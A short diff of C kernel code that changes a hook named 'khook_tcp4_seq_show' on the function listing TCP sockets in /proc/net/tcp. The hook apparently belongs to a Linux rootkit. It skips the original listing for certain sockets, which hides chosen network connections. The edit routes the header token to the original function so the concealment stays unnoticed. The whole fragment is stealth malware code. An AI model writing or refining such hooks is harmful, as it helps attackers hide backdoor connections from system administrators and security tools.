@@ -871,10 +871,8 @@ static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 
 	KHOOK_GET(tcp4_seq_show);
 
-	// seq_setwidth(seq, TMPSZ - 1);
 	if (v == SEQ_START_TOKEN) {
-		ret = 0;
-		goto out;
+		goto origin;
 	}
 
 	inet = (struct inet_sock *)sk;
@@ -895,7 +893,7 @@ static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 			goto out;
 		}
 	}
-
+origin:
 	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
 out:
 	KHOOK_PUT(tcp4_seq_show);
